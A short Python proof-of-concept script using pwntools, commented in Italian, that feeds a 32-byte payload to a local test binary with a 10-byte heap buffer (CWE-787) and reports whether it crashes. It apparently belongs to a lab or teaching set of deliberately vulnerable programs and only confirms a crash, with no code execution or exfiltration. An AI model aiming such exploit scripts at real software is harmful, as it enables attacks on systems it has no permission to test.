/**
 * @file Exploit_Heap_Buffer_Overflow.py
 * @brief PoC per CWE-787 Heap Buffer Overflow
 * Target: build/CWE-787 Heap Buffer Overflow
 */
from pwn import *
import sys

context.log_level = 'info'

def exploit():
    exe = './build/CWE-787 Heap Buffer Overflow'
    
    # Il buffer allocato con malloc è di 10 byte.
    # Scrivendo più di 10 byte si corrompe l'heap metadata (chunk size, flags, ecc.)
    payload = b'B' * 32
    
    log.info(f"Esecuzione di {exe} con payload di {len(payload)} byte...")
    
    try:
        p = process([exe, payload])
        
        # Spesso heap overflow non crasha immediatamente, ma corrompe lo stato
        # Se compilato con check (es. glibc recenti), potrebbe abortire.
        output = p.recvall(timeout=2)
        log.info(f"Output:\n{output.decode(errors='ignore')}")
        
        # Controlliamo il codice di uscita
        if p.poll() != 0:
            log.success("Il programma è crashato o ha abortito (Vulnerabilità confermata!)")
        else:
            log.warning("Il programma non è crashato (potrebbe aver corrotto silenziosamente l'heap)")
            
        p.close()

    except Exception as e:
        log.error(f"Errore: {e}")

if __name__ == "__main__":
    exploit()
